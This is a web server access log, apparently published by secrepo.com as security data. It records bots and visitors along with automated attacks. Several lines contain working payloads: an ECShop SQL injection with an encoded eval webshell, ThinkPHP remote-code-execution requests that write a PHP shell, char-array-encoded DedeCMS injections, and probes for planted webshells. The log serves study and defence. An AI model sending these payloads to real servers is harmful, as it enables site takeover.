122.247.179.178 - - [24/Apr/2019:14:14:31 -0700] "GET /user.php?act=login HTTP/1.1" 404 294 "554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\"num\";s:288:\"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A325A6B5A334575634768774A79776E50443977614841675A585A686243676B583142505531526262475678645630704F79412F506963702729293B2F2F7D787878,10-- -\";s:2:\"id\";s:3:\"'/*\";}" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
122.247.179.178 - - [24/Apr/2019:14:14:31 -0700] "POST /fdgq.php HTTP/1.1" 404 294 "http://www.secrepo.com/fdgq.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
122.247.179.178 - - [24/Apr/2019:14:14:32 -0700] "GET /?s=index/%5Cthink%5Ctemplate%5Cdriver%5Cfile/write&cacheFile=lijgr.php&content=%3C?php%20print(md5(222));$a=str_replace(%22vbnm%22,%22%22,%22asvbnmsert%22);@$a($_POST%5Bysy%5D);?%3Eysydjsjxbei37 HTTP/1.1" 200 46423 "http://www.secrepo.com/?s=index/\\think\\template\\driver\\file/write&cacheFile=lijgr.php&content=<?php print(md5(222));$a=str_replace(\"vbnm\",\"\",\"asvbnmsert\");@$a($_POST[ysy]);?>ysydjsjxbei37" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
122.247.179.178 - - [24/Apr/2019:14:14:32 -0700] "GET /lijgr.php HTTP/1.1" 404 294 "http://www.secrepo.com/lijgr.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
122.247.179.178 - - [24/Apr/2019:14:14:32 -0700] "GET /user.php?act=login HTTP/1.1" 404 294 "45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:\"num\";s:297:\"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A336C7A655846784C6E426F634363734A7A772F63476877494756325957776F4A46395154314E5557336C7A655630704F79412F506963702729293B2F2F7D787878,10-- -\";s:2:\"id\";s:11:\"-1' UNION/*\";}45ea207d7a2b68c49582d2d22adf953a" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
122.247.179.178 - - [24/Apr/2019:14:14:33 -0700] "POST /ysyqq.php HTTP/1.1" 404 294 "http://www.secrepo.com/ysyqq.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
122.247.179.178 - - [24/Apr/2019:14:14:33 -0700] "GET /?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=file_put_contents&vars%5B1%5D%5B%5D=fybem.php&vars%5B1%5D%5B%5D=%3C?php%20print(md5(222));$a=str_replace(%22vbnm%22,%22%22,%22asvbnmsert%22);@$a($_POST%5Bysy%5D);?%3Eysydjsjxbei37$ HTTP/1.1" 200 46423 "http://www.secrepo.com/?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=fybem.php&vars[1][]=<?php print(md5(222));$a=str_replace(\"vbnm\",\"\",\"asvbnmsert\");@$a($_POST[ysy]);?>ysydjsjxbei37$" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
122.247.179.178 - - [24/Apr/2019:14:14:33 -0700] "GET /fybem.php HTTP/1.1" 404 294 "http://www.secrepo.com/fybem.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
122.247.179.178 - - [24/Apr/2019:14:14:33 -0700] "GET /plus/mytag_js.php?dopost=saveedit&arrs1%5B%5D=99&arrs1%5B%5D=102&arrs1%5B%5D=103&arrs1%5B%5D=95&arrs1%5B%5D=100&arrs1%5B%5D=98&arrs1%5B%5D=112&arrs1%5B%5D=114&arrs1%5B%5D=101&arrs1%5B%5D=102&arrs1%5B%5D=105&arrs1%5B%5D=120&arrs2%5B%5D=109&arrs2%5B%5D=121&arrs2%5B%5D=116&arrs2%5B%5D=97&arrs2%5B%5D=103&arrs2%5B%5D=96&arrs2%5B%5D=32&arrs2%5B%5D=40&arrs2%5B%5D=97&arrs2%5B%5D=105&arrs2%5B%5D=100&arrs2%5B%5D=44&arrs2%5B%5D=110&arrs2%5B%5D=111&arrs2%5B%5D=114&arrs2%5B%5D=109&arrs2%5B%5D=98&arrs2%5B%5D=111&arrs2%5B%5D=100&arrs2%5B%5D=121&arrs2%5B%5D=41&arrs2%5B%5D=32&arrs2%5B%5D=86&arrs2%5B%5D=65&arrs2%5B%5D=76&arrs2%5B%5D=85&arrs2%5B%5D=69&arrs2%5B%5D=83&arrs2%5B%5D=40&arrs2%5B%5D=57&arrs2%5B%5D=48&arrs2%5B%5D=57&arrs2%5B%5D=48&arrs2%5B%5D=44&arrs2%5B%5D=39&arrs2%5B%5D=60&arrs2%5B%5D=63&arrs2%5B%5D=112&arrs2%5B%5D=104&arrs2%5B%5D=112&arrs2%5B%5D=32&arrs2%5B%5D=101&arrs2%5B%5D=99&arrs2%5B%5D=104&arrs2%5B%5D=111&arrs2%5B%5D=32&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=100&arrs2%5B%5D=101&arrs2%5B%5D=100&arrs2%5B%5D=101&arrs2%5B%5D=99&arrs2%5B%5D=109&arrs2%5B%5D=115&arrs2%5B%5D=32&arrs2%5B%5D=53&arrs2%5B%5D=46&arrs2%5B%5D=55&arrs2%5B%5D=32&arrs2%5B%5D=48&arrs2%5B%5D=100&arrs2%5B%5D=97&arrs2%5B%5D=121&arrs2%5B%5D=60&arrs2%5B%5D=98&arrs2%5B%5D=114&arrs2%5B%5D=62&arrs2%5B%5D=103&arrs2%5B%5D=117&arrs2%5B%5D=105&arrs2%5B%5D=103&arrs2%5B%5D=101&arrs2%5B%5D=44&arrs2%5B%5D=32&arrs2%5B%5D=57&arrs2%5B%5D=48&arrs2%5B%5D=115&arrs2%5B%5D=101&arrs2%5B%5D=99&arrs2%5B%5D=46&arrs2%5B%5D=111&arrs2%5B%5D=114&arrs2%5B%5D=103&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=59&arrs2%5B%5D=64&arrs2%5B%5D=112&arrs2%5B%5D=114&arrs2%5B%5D=101&arrs2%5B%5D=103&arrs2%5B%5D=95&arrs2%5B%5D=114&arrs2%5B%5D=101&arrs2%5B%5D=112&arrs2%5B%5D=108&arrs2%5B%5D=97&arrs2%5B%5D=99&arrs2%5B%5D=101&arrs2%5B%5D=40&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=47&arrs2%5B%5D=91&arrs2%5B%5D=99&arrs2%5B%5D=111&arrs2%5B%5D=112&arrs2%5B%5D=121&arrs2%5B%5D=114&arrs2%5B%5D=105&arrs2%5B%5D=103&arrs2%5B%5D=104&arrs2%5B%5D=116&arrs2%5B%5D=93&arrs2%5B%5D=47&arrs2%5B%5D=101&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=44&arrs2%5B%5D=36&arrs2%5B%5D=95&arrs2%5B%5D=82&arrs2%5B%5D=69&arrs2%5B%5D=81&arrs2%5B%5D=85&arrs2%5B%5D=69&arrs2%5B%5D=83&arrs2%5B%5D=84&arrs2%5B%5D=91&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=103&arrs2%5B%5D=117&arrs2%5B%5D=105&arrs2%5B%5D=103&arrs2%5B%5D=101&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=93&arrs2%5B%5D=44&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=101&arrs2%5B%5D=114&arrs2%5B%5D=114&arrs2%5B%5D=111&arrs2%5B%5D=114&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=41&arrs2%5B%5D=59&arrs2%5B%5D=63&arrs2%5B%5D=62&arrs2%5B%5D=39&arrs2%5B%5D=41&arrs2%5B%5D=59&arrs2%5B%5D=0 HTTP/1.1" 404 294 "http://www.secrepo.com/plus/mytag_js.php?dopost=saveedit&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=116&arrs2[]=97&arrs2[]=103&arrs2[]=96&arrs2[]=32&arrs2[]=40&arrs2[]=97&arrs2[]=105&arrs2[]=100&arrs2[]=44&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=41&arrs2[]=32&arrs2[]=86&arrs2[]=65&arrs2[]=76&arrs2[]=85&arrs2[]=69&arrs2[]=83&arrs2[]=40&arrs2[]=57&arrs2[]=48&arrs2[]=57&arrs2[]=48&arrs2[]=44&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=99&arrs2[]=104&arrs2[]=111&arrs2[]=32&arrs2[]=39&arrs2[]=39&arrs2[]=100&arrs2[]=101&arrs2[]=100&arrs2[]=101&arrs2[]=99&arrs2[]=109&arrs2[]=115&arrs2[]=32&arrs2[]=53&arrs2[]=46&arrs2[]=55&arrs2[]=32&arrs2[]=48&arrs2[]=100&arrs2[]=97&arrs2[]=121&arrs2[]=60&arrs2[]=98&arrs2[]=114&arrs2[]=62&arrs2[]=103&arrs2[]=117&arrs2[]=105&arrs2[]=103&arrs2[]=101&arrs2[]=44&arrs2[]=32&arrs2[]=57&arrs2[]=48&arrs2[]=115&arrs2[]=101&arrs2[]=99&arrs2[]=46&arrs2[]=111&arrs2[]=114&arrs2[]=103&arrs2[]=39&arrs2[]=39&arrs2[]=59&arrs2[]=64&arrs2[]=112&arrs2[]=114&arrs2[]=101&arrs2[]=103&arrs2[]=95&arrs2[]=114&arrs2[]=101&arrs2[]=112&arrs2[]=108&arrs2[]=97&arrs2[]=99&arrs2[]=101&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=47&arrs2[]=91&arrs2[]=99&arrs2[]=111&arrs2[]=112&arrs2[]=121&arrs2[]=114&arrs2[]=105&arrs2[]=103&arrs2[]=104&arrs2[]=116&arrs2[]=93&arrs2[]=47&arrs2[]=101&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=36&arrs2[]=95&arrs2[]=82&arrs2[]=69&arrs2[]=81&arrs2[]=85&arrs2[]=69&arrs2[]=83&arrs2[]=84&arrs2[]=91&arrs2[]=39&arrs2[]=39&arrs2[]=103&arrs2[]=117&arrs2[]=105&arrs2[]=103&arrs2[]=101&arrs2[]=39&arrs2[]=39&arrs2[]=93&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=101&arrs2[]=114&arrs2[]=114&arrs2[]=111&arrs2[]=114&arrs2[]=39&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=0" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
122.247.179.178 - - [24/Apr/2019:14:14:33 -0700] "GET /plus/download.php?open=1&arrs1%5B%5D=99&arrs1%5B%5D=102&arrs1%5B%5D=103&arrs1%5B%5D=95&arrs1%5B%5D=100&arrs1%5B%5D=98&arrs1%5B%5D=112&arrs1%5B%5D=114&arrs1%5B%5D=101&arrs1%5B%5D=102&arrs1%5B%5D=105&arrs1%5B%5D=120&arrs2%5B%5D=109&arrs2%5B%5D=121&arrs2%5B%5D=97&arrs2%5B%5D=100&arrs2%5B%5D=96&arrs2%5B%5D=32&arrs2%5B%5D=83&arrs2%5B%5D=69&arrs2%5B%5D=84&arrs2%5B%5D=32&arrs2%5B%5D=96&arrs2%5B%5D=110&arrs2%5B%5D=111&arrs2%5B%5D=114&arrs2%5B%5D=109&arrs2%5B%5D=98&arrs2%5B%5D=111&arrs2%5B%5D=100&arrs2%5B%5D=121&arrs2%5B%5D=96&arrs2%5B%5D=32&arrs2%5B%5D=61&arrs2%5B%5D=32&arrs2%5B%5D=39&arrs2%5B%5D=60&arrs2%5B%5D=63&arrs2%5B%5D=112&arrs2%5B%5D=104&arrs2%5B%5D=112&arrs2%5B%5D=32&arrs2%5B%5D=102&arrs2%5B%5D=105&arrs2%5B%5D=108&arrs2%5B%5D=101&arrs2%5B%5D=95&arrs2%5B%5D=112&arrs2%5B%5D=117&arrs2%5B%5D=116&arrs2%5B%5D=95&arrs2%5B%5D=99&arrs2%5B%5D=111&arrs2%5B%5D=110&arrs2%5B%5D=116&arrs2%5B%5D=101&arrs2%5B%5D=110&arrs2%5B%5D=116&arrs2%5B%5D=115&arrs2%5B%5D=40&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=109&arrs2%5B%5D=111&arrs2%5B%5D=111&arrs2%5B%5D=110&arrs2%5B%5D=46&arrs2%5B%5D=112&arrs2%5B%5D=104&arrs2%5B%5D=112&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=44&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=60&arrs2%5B%5D=63&arrs2%5B%5D=112&arrs2%5B%5D=104&arrs2%5B%5D=112&arrs2%5B%5D=32&arrs2%5B%5D=101&arrs2%5B%5D=118&arrs2%5B%5D=97&arrs2%5B%5D=108&arrs2%5B%5D=40&ar HTTP/1.1" 418 731 "http://www.secrepo.com/plus/download.php?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=97&arrs2[]=100&arrs2[]=96&arrs2[]=32&arrs2[]=83&arrs2[]=69&arrs2[]=84&arrs2[]=32&arrs2[]=96&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=96&arrs2[]=32&arrs2[]=61&arrs2[]=32&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=102&arrs2[]=105&arrs2[]=108&arrs2[]=101&arrs2[]=95&arrs2[]=112&arrs2[]=117&arrs2[]=116&arrs2[]=95&arrs2[]=99&arrs2[]=111&arrs2[]=110&arrs2[]=116&arrs2[]=101&arrs2[]=110&arrs2[]=116&arrs2[]=115&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=109&arrs2[]=111&arrs2[]=111&arrs2[]=110&arrs2[]=46&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=118&arrs2[]=97&arrs2[]=108&arrs2[]=40&ar" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
122.247.179.178 - - [24/Apr/2019:14:14:34 -0700] "POST /admin_aspcms/_system/AspCms_SiteSetting.asp HTTP/1.1" 404 295 "http://www.secrepo.com/admin_aspcms/_system/AspCms_SiteSetting.asp" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
122.247.179.178 - - [24/Apr/2019:14:14:34 -0700] "POST /e/DoInfo/ecms.php HTTP/1.1" 404 294 "http://www.secrepo.com/e/DoInfo/ecms.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
113.171.224.176 - - [24/Apr/2019:14:14:45 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
162.210.196.129 - - [24/Apr/2019:14:32:28 -0700] "GET /robots.txt HTTP/1.1" 200 289 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
162.210.196.129 - - [24/Apr/2019:14:32:30 -0700] "GET / HTTP/1.1" 200 46368 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
27.66.160.101 - - [24/Apr/2019:14:34:55 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36" 
176.8.91.244 - - [24/Apr/2019:14:39:25 -0700] "GET /honeypot/ HTTP/1.1" 200 1077 "http://glass-system.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Media Center PC" 
176.8.91.244 - - [24/Apr/2019:14:39:25 -0700] "GET /honeypot/ HTTP/1.1" 200 1077 "http://glass-system.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Media Center PC" 
176.8.91.244 - - [24/Apr/2019:14:39:26 -0700] "GET /honeypot/ HTTP/1.1" 200 1077 "http://glass-system.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Media Center PC" 
49.206.5.214 - - [24/Apr/2019:14:42:16 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
49.206.5.214 - - [24/Apr/2019:14:42:17 -0700] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
223.216.227.66 - - [24/Apr/2019:14:45:41 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
157.55.39.253 - - [24/Apr/2019:14:47:42 -0700] "GET /Datasets%20Description/Network/files.html HTTP/1.1" 304 189 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
171.241.105.80 - - [24/Apr/2019:14:49:38 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 1279418 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36 OPR/52.0.2871.64" 
66.249.64.188 - - [24/Apr/2019:14:50:23 -0700] "GET /ads.txt HTTP/1.1" 301 494 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.64.45 - - [24/Apr/2019:14:50:24 -0700] "GET /robots.txt HTTP/1.1" 200 334 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.64.43 - - [24/Apr/2019:15:01:16 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
103.225.93.6 - - [24/Apr/2019:15:02:41 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
103.225.93.6 - - [24/Apr/2019:15:02:42 -0700] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
64.89.234.161 - - [24/Apr/2019:15:03:12 -0700] "GET / HTTP/1.1" 301 427 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36" 
64.89.234.161 - - [24/Apr/2019:15:03:12 -0700] "GET / HTTP/1.1" 200 12455 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36" 
3.91.54.118 - - [24/Apr/2019:15:10:17 -0700] "GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.1" 200 2928460 "-" "python-requests/2.18.4" 
188.76.8.51 - - [24/Apr/2019:15:12:47 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/605.1.15 (KHTML, like Gecko)" 
188.76.8.51 - - [24/Apr/2019:15:12:48 -0700] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 340 "-" "Safari/11605.2.8 CFNetwork/760.7 Darwin/15.6.0 (x86_64)" 
188.76.8.51 - - [24/Apr/2019:15:12:48 -0700] "GET /apple-touch-icon.png HTTP/1.1" 404 339 "-" "Safari/11605.2.8 CFNetwork/760.7 Darwin/15.6.0 (x86_64)" 
188.76.8.51 - - [24/Apr/2019:15:12:49 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Safari/11605.2.8 CFNetwork/760.7 Darwin/15.6.0 (x86_64)" 
188.76.8.51 - - [24/Apr/2019:15:12:50 -0700] "GET / HTTP/1.1" 200 12511 "-" "\"Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1\"" 
188.76.8.51 - - [24/Apr/2019:15:12:51 -0700] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 339 "-" "Safari/11605.2.8 CFNetwork/760.7 Darwin/15.6.0 (x86_64)" 
188.76.8.51 - - [24/Apr/2019:15:12:51 -0700] "GET /apple-touch-icon.png HTTP/1.1" 404 339 "-" "Safari/11605.2.8 CFNetwork/760.7 Darwin/15.6.0 (x86_64)" 
188.76.8.51 - - [24/Apr/2019:15:12:51 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Safari/11605.2.8 CFNetwork/760.7 Darwin/15.6.0 (x86_64)" 
222.186.57.142 - - [24/Apr/2019:15:14:48 -0700] "GET / HTTP/1.1" 200 46424 "http://www.secrepo.com/" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.57.142 - - [24/Apr/2019:15:14:49 -0700] "POST //lequ.php HTTP/1.1" 404 294 "http://www.secrepo.com//lequ.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.57.142 - - [24/Apr/2019:15:14:49 -0700] "POST //data/cache/asd.php HTTP/1.1" 404 294 "http://www.secrepo.com//data/cache/asd.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.57.142 - - [24/Apr/2019:15:14:49 -0700] "POST //coon.php HTTP/1.1" 404 294 "http://www.secrepo.com//coon.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.57.142 - - [24/Apr/2019:15:14:50 -0700] "POST //lx.php HTTP/1.1" 404 294 "http://www.secrepo.com//lx.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.57.142 - - [24/Apr/2019:15:14:50 -0700] "POST //x.php HTTP/1.1" 404 294 "http://www.secrepo.com//x.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.57.142 - - [24/Apr/2019:15:14:50 -0700] "POST //12345.php HTTP/1.1" 404 294 "http://www.secrepo.com//12345.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.57.142 - - [24/Apr/2019:15:14:50 -0700] "POST //plus/mytag_js.php?aid=511348 HTTP/1.1" 404 294 "http://www.secrepo.com//plus/mytag_js.php?aid=511348" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.57.142 - - [24/Apr/2019:15:14:51 -0700] "POST //plus/mytag_js.php?aid=511348 HTTP/1.1" 404 294 "http://www.secrepo.com//plus/mytag_js.php?aid=511348" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.57.142 - - [24/Apr/2019:15:14:51 -0700] "POST //plus/mytag_js.php?aid=511348 HTTP/1.1" 404 294 "http://www.secrepo.com//plus/mytag_js.php?aid=511348" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.57.142 - - [24/Apr/2019:15:14:51 -0700] "POST //config/AspCms_Config.asp HTTP/1.1" 404 294 "http://www.secrepo.com//config/AspCms_Config.asp" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.57.142 - - [24/Apr/2019:15:14:51 -0700] "POST //plus/mytag_js.php?aid=9527 HTTP/1.1" 404 294 "http://www.secrepo.com//plus/mytag_js.php?aid=9527" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.57.142 - - [24/Apr/2019:15:14:51 -0700] "POST //plus/mytag_js.php?aid=9527 HTTP/1.1" 404 294 "http://www.secrepo.com//plus/mytag_js.php?aid=9527" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.57.142 - - [24/Apr/2019:15:14:52 -0700] "POST //plus/mytag_js.php?aid=9527 HTTP/1.1" 404 294 "http://www.secrepo.com//plus/mytag_js.php?aid=9527" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.57.142 - - [24/Apr/2019:15:14:52 -0700] "POST //Config_Shell.php HTTP/1.1" 404 294 "http://www.secrepo.com//Config_Shell.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.57.142 - - [24/Apr/2019:15:14:52 -0700] "POST //data/cache/asd.php HTTP/1.1" 404 294 "http://www.secrepo.com//data/cache/asd.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.57.142 - - [24/Apr/2019:15:14:52 -0700] "POST //plus/lucas.php HTTP/1.1" 404 294 "http://www.secrepo.com//plus/lucas.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.57.142 - - [24/Apr/2019:15:14:53 -0700] "POST //plus/read.php HTTP/1.1" 404 294 "http://www.secrepo.com//plus/read.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.57.142 - - [24/Apr/2019:15:14:53 -0700] "POST //indexa.php HTTP/1.1" 404 294 "http://www.secrepo.com//indexa.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.57.142 - - [24/Apr/2019:15:14:53 -0700] "POST //data/cache/flye.php HTTP/1.1" 404 294 "http://www.secrepo.com//data/cache/flye.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.57.142 - - [24/Apr/2019:15:14:54 -0700] "POST //plus/mybak.php HTTP/1.1" 404 294 "http://www.secrepo.com//plus/mybak.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.57.142 - - [24/Apr/2019:15:14:54 -0700] "POST //plus/x.php HTTP/1.1" 404 294 "http://www.secrepo.com//plus/x.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.57.142 - - [24/Apr/2019:15:14:54 -0700] "POST //x.php HTTP/1.1" 404 294 "http://www.secrepo.com//x.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.57.142 - - [24/Apr/2019:15:14:54 -0700] "POST //d.php HTTP/1.1" 404 294 "http://www.secrepo.com//d.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
157.55.39.253 - - [24/Apr/2019:15:15:42 -0700] "GET /self.logs/access.log.2018-06-17.gz HTTP/1.1" 200 21993 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
113.171.224.176 - - [24/Apr/2019:15:20:45 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
122.53.171.15 - - [24/Apr/2019:15:25:48 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
207.46.13.176 - - [24/Apr/2019:15:39:25 -0700] "GET /self.logs/access.log.2017-06-14.gz HTTP/1.1" 200 37215 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
66.102.6.156 - - [24/Apr/2019:15:45:32 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" 
66.102.6.156 - - [24/Apr/2019:15:45:32 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" 
77.75.77.32 - - [24/Apr/2019:15:45:37 -0700] "GET /robots.txt HTTP/1.1" 200 334 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)" 
